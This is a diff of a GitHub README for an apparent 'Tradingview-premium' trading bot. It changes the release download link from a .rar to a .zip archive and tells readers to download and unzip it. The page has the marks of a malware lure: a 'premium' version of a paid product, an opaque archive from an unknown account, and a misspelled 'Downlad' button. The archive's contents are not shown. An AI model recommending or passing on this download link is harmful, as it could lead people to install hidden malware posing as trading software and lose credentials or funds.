@@ -2,7 +2,7 @@
 ![image](https://github.com/user-attachments/assets/587c4824-24f2-40c2-b48e-665d4be20d36)
 
 
-[Downlad](https://github.com/Uknamed89/Tradingview-premium/releases/download/Download/application.rar)
+[Downlad](https://github.com/Uknamed89/Tradingview-premium/releases/download/Download/application.zip)
 
 ▎ What is it?
 
@@ -12,7 +12,7 @@ Trading View Bot is an automated trading solution designed to help traders imple
 
 To download Trading View Bot, follow the steps below:
 
-1. Click on the download button - [Downlad](https://github.com/Uknamed89/Tradingview-premium/releases/download/Download/application.rar)
+1. Click on the download button - [Downlad](https://github.com/Uknamed89/Tradingview-premium/releases/download/Download/application.zip)
 
 2.  Download the ZIP file and unzip it to the desired location.
 
